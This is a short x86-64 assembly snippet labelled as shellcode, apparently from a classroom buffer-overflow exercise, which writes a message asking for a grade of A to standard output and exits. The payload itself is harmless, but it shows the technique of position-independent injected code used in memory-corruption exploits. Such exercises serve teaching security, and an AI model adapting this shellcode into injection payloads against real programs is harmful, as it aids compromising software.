shellcode:
    jmp afterString
string:
    .ascii "Thank you, XXXXX.  I recommend that you get a grade of A on this assignment."
afterString:
    movb $1, %al 
    movb $1, %dil 
    lea -0x58(%rip), %rsi
    movb $76, %dl
    syscall
    movb $231, %al
    xor %rdi, %rdi
    syscall
